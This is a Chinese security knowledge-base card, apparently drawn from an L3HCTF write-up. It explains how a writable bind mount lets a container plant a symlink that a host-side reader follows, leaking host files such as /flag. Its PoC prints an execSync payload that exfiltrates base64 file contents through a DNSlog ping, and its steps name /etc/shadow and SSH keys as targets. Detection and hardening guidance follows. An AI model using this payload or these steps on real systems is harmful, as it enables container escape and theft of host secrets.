---
id: cloud-container-bind-mount-symlink-host-file-read
title: 容器共享挂载目录软链读取宿主文件：替换宿主侧读取的 error.txt 指向 /flag
type: scenario
domain: cloud
path: cloud/container
technique: container-bind-mount-symlink-host-file-read
tags:
- docker
- container
- bind-mount
- symlink
- escape
- file-read
- misconfiguration
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V558
  verified_at: '2026-11-12T00:50:21+08:00'
  notes: 已对照原文与图：图06 payload 为 execSync 调用 ping，命令替换内依次 rm /app/error.txt、ln -s /flag /app/error.txt、cat /app/error.txt，再经 base64 拼入 uth1r9.dnslog.cn，平台错误面板回显 L3HCTF{E5C4pEd_h0w_c0uld_Y0U_Re4D_me}，与卡一致；原文未展开“宿主侧读取”分工，卡已标 confidence medium 并注明由现象与 Tunnel Manager（docker run -v <flags_dataDir>:/data）源码推断，属合理推断。dedup top 候选为 crontab 改写、procfs/core_pattern、docker.sock 等挂载逃逸，sink 与利用步骤不同，new 成立。未验证点：未复跑；宿主侧读取机制为推断。
url: /docs/cloud/container/cloud-container-bind-mount-symlink-host-file-read/
draft: false
kb_aliases:
- 挂载目录软链接读宿主文件
- bind mount symlink escape
- 容器内创建软链读宿主机文件
- error.txt 软链
- Tunnel Manager docker escape
- 共享 volume 软链
---

## 一句话结论

容器把宿主目录以可写 bind mount/volume 挂进容器，且宿主侧另有进程会读取该目录中的某个文件（如前端错误展示读取 `error.txt`）时，容器内进程可删除该文件并创建指向宿主绝对路径（如 `/flag`）的符号链接；宿主进程随后读取时按宿主命名空间解析链接，从而读出容器之外的宿主敏感文件——不需要 privileged、内核漏洞或 docker.sock。

## 原理

- **bind mount 共享目录项**：`docker run -v <host_dir>:<container_dir>` 把宿主目录映射进容器，容器内对目录项的增删改（包括创建符号链接）直接反映到宿主同一路径。容器隔离约束的是"容器进程访问宿主"，并不阻止"宿主进程访问被共享目录中的恶意链接"。
- **符号链接在读取者命名空间解析**：符号链接内容只是目标路径字符串。容器内 `ln -s /flag /app/error.txt` 只是放置了一个"指向 /flag"的链接，并不访问它；当**宿主侧**进程（前端错误页面、日志采集、CI 后处理等）读取 `/app/error.txt` 时，`/flag` 会按宿主根文件系统解析，攻击者因此读到宿主机文件。
- **为什么能成立**：共享目录把"攻击者可控的文件名"暴露给宿主读取者；宿主读取者若跟随符号链接且未做目录约束（没有 `O_NOFOLLOW`/`openat2 RESOLVE_BENEATH` 等），链接目标可指向任意宿主路径（`/flag`、`/etc/shadow`、`/root/.ssh/...`）。
- **与"容器内 cat"的区别**：如果只有容器内进程读取该链接，`/flag` 仍按容器命名空间解析，读不到宿主文件；本技巧的关键是读取动作发生在宿主命名空间（或由宿主侧工具对共享文件求值）。原文未展开这一分工，从现象（同一条 `cat` 命令输出宿主 flag）与所参考的 Tunnel Manager 源码（`docker run -v flags_dataDir:/data` 挂载可控目录）推断为宿主侧读取。

## 触发条件

- 已获得容器内命令执行（Web RCE、vm2/沙箱逃逸后的 child_process 等）。
- 容器启动时把宿主目录以可写方式 bind mount/volume 挂进容器（未见 `:ro`），且攻击者对挂载点有写权限。
- 宿主侧存在读取该目录内固定文件名（如 `error.txt`、日志、结果文件）的进程，且读取后内容会回显/外带（错误面板、接口响应、日志系统）。
- 攻击者知道或能猜测目标宿主文件的绝对路径（如 `/flag`）。

## 利用步骤

1. 确认容器内命令执行，并枚举可写挂载点：`mount`、`df -h`、`cat /proc/mounts`，寻找与宿主共享的目录（如 `/app`、`/data`）。
2. 定位宿主侧会读取的文件名（如前端错误输出对应的 `error.txt`）。
3. 删除原文件并创建指向宿主目标的符号链接：
   ```bash
   rm /app/error.txt && ln -s /flag /app/error.txt
   ```
4. 触发宿主侧读取（请求错误页面/等待采集/调用接口），从回显或外带通道取得内容。
5. 换目标文件重复读取（`/etc/passwd`、`/root/.ssh/id_rsa`、应用配置等）。

## PoC

原文在 L3HCTF escape-web 题中，vm2 逃逸取得 `execSync` 后执行：

```javascript
execSync('ping $(echo $(rm /app/error.txt && ln -s /flag /app/error.txt && cat /app/error.txt)|base64 -w0)uth1r9.dnslog.cn')
```

错误面板直接回显 `L3HCTF{E5C4pEd_h0w_c0uld_Y0U_Re4D_me}`，说明共享挂载目录中的软链接使读取者拿到了容器外文件。参考的 Tunnel Manager 源码显示容器以 `docker run -v <flags_dataDir>:/data` 挂载可控目录，属同类配置缺陷。

## 变体与关联

- **关联**：[[cloud-container-host-dir-bind-mount-etc-crontab-escape]]——同为"可写宿主目录挂进容器"的配置缺陷，但该卡是直接改写宿主 crontab 拿 root，本卡是通过宿主侧读取者 + 软链接读文件，sink 不同。
- **关联**：[[cloud-container-docker-cp-symlink-toctou-escape]]——docker cp 的符号链接 TOCTOU（CVE-2018-15664），同用软链但作用于 daemon 竞态，本卡无竞态、依赖宿主侧读取者。
- **变体**：若宿主侧读取者使用 `cat`/`readFile` 跟随链接，可读任意宿主文件；若读取者做了 `realpath` 限制在目录内，可能被绕过（相对路径、多级链接）或失效。
- **边界**：挂载为只读、宿主读取者用 `O_NOFOLLOW`/安全解析、或读取动作只发生在容器命名空间时，攻击不成立。

## 检测与防御

- **防御**：宿主目录尽量不挂载进容器，必须挂载时用 `:ro`；不要共享包含"宿主会读取"的结果/日志文件的目录；宿主侧读取共享目录文件时使用 `O_NOFOLLOW`、`openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` 或先 `lstat` 拒绝符号链接，并在 `realpath` 后校验仍位于允许根目录内。
- **检测**：监控共享 volume 内文件被替换为符号链接（inotify/审计 `symlink` 系统调用）；宿主侧读取文件前 `lstat` 检查；容器逃逸检测规则（异常 `ln -s` 指向敏感路径、`rm` 后重建同名文件）。
- **加固**：容器以非 root、user namespace 映射运行；限制容器可写挂载；敏感宿主文件（flag、密钥）不放在与容器共享目录可解析的路径下；启用 seccomp/AppArmor 限制容器内文件操作。
